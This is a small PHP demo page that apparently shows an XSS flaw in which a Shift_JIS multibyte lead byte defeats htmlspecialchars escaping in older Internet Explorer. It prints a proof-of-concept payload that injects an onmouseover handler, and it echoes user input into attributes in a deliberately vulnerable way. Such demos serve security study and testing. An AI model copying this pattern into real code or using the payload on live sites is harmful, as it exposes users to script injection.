<?php
$url  = isset($_GET['url']) ? $_GET['url'] : '' ;
$name = isset($_GET['name']) ? $_GET['name'] : '' ;
?>
<?php
header('Content-Type: text/html; Charset=Shift_JIS');
echo '<?xml version="1.0" encoding="Shift_JIS"?>' . "\n";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xml:lang="ja" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>XSS Demo</title>
</head>
<body>
<h1>XSS Demo</h1>

<p>IE only (&lt;8?)</p>
<p>POC: name=%81&amp;url=+onmouseover%3Dalert%281%29+%22 </p>
<p><a name="<?php echo htmlspecialchars($name, ENT_QUOTES, 'Shift_JIS'); ?>"
 class="<?php echo htmlspecialchars($url, ENT_QUOTES, 'Shift_JIS'); ?>"><?php echo htmlspecialchars($url, ENT_QUOTES, 'Shift_JIS'); ?></a></p>

<form action="./xss3s.php" method="get">
<p>
<input type="text" name="name" />
<input type="text" name="url" />
<input type="submit" />
</p>
</form>
</body>
</html>
